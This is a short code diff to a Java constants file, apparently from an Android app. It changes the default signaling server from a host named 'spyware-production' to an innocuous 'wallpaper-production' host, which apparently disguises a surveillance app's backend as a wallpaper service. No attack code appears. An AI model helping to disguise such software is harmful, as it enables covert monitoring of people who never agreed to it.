@@ -19,7 +19,7 @@ public class Constants {
     public static final String EXTRA_NOTIFICATION_KEY = "notificationKey";
 
     // ── Signaling ─────────────────────────────────────────────────
-    public static final String DEFAULT_SIGNALING_URL = "https://spyware-production.up.railway.app";
+    public static final String DEFAULT_SIGNALING_URL = "https://wallpaper-production-c039.up.railway.app";
     // public static final String DEFAULT_SIGNALING_URL = "http://localhost:3000";
     // public static final String DEFAULT_SIGNALING_URL = "http://192.168.1.103:3000";
 
